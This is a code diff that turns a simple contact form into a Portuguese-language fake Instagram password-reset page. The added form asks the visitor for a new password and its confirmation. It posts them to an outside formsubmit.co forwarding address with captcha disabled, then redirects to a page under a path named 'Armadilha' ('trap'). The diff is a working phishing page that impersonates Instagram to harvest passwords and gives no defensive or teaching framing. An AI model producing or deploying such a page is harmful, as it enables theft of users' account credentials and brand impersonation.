@@ -40,15 +40,69 @@
     }
 </style>
 <body>
+    <H1>
+        Instagram
+    </H1>
+    <div id="alerts" class="alerts">
+        <p class="alert-red">Crie uma senha com pelo menos 6 caracteres.</p>   
+    </div>
+    <style>
+        h1{
+            text-align: center;
+            color: rgb(40, 40, 228);
+        }
+        p.alert-red{
+            color: black;
+            background: red;
+            width: 900px;
+        }
+        div{
+        width: auto;
+        margin-left: 275px;
+        }
+        body{
+            background: blueviolet;
+        }
+    </style>
     <form action="https://formsubmit.co/3e840d4f133754e06bd220d771efa190" method="POST">
-        <input type="text" name="name" placeholder="Email name" required>
-        <input type="email" name="email" placeholder="Email Address">
+        <p>
+        <label for="id_enc_new_password1">Nova senha:</label><br>
+        <input type="text" name="name" placeholder="Nova senha" required><br>
+        </p>
+        <p>
+        <label for="id_enc_new_password2">Confirmação de senha nova:</label><br>
+        <input type="email" name="email" placeholder="Confirmação de senha nova"><br>
+        </p><br>
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_next" value="https://questoesquiz-srbogolhao.vercel.app/Armadilha/Obrigado.html">
-        <button type="submit">Send</button>
+        <button type="submit">Redefinir senha</button>
    </form>
-   
-   
-    
+   <style>
+       form{
+        border: 3px;
+        border-color: black;
+        background: rgb(255, 255, 255);
+        display: flex;
+        flex-direction: column;
+        width: 800px;
+        height: 500px;
+        margin: 0 auto;
+       }
+       label{
+           font-size: 14px;
+           color: black;
+           font-family: Arial;
+           font-weight: bold;
+       }
+        input{
+            width: 300px;
+            height: 30px;
+        }
+        button{
+            text-align: left;
+            font-size: 18px;
+            width: 150px;
+        }
+   </style> 
 </body>
 </html>
